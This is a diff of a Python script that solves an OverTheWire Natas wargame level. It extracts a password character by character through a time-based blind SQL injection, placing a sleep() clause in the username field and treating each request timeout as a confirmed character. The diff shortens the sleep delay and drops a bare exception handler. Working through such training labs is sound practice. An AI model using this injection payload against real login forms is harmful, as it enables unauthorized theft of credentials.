@@ -23,12 +23,10 @@ def get_secret(debug=False):
                     print(f"checking: {password}{i}")
 
                 req.post(get_level_url(level_number), timeout=4,
-                         data={"username": f"natas16\" and password like binary '{password}{i}%' and sleep(8) #"})
+                         data={"username": f"natas16\" and password like binary '{password}{i}%' and sleep(5) #"})
             except requests.Timeout:
                 password += i
                 break
-            except Exception:
-                pass
 
             # loop ended, but we didn't find new char. :(
             # so we had a timeout cuz of internet connection not mysql sleep.
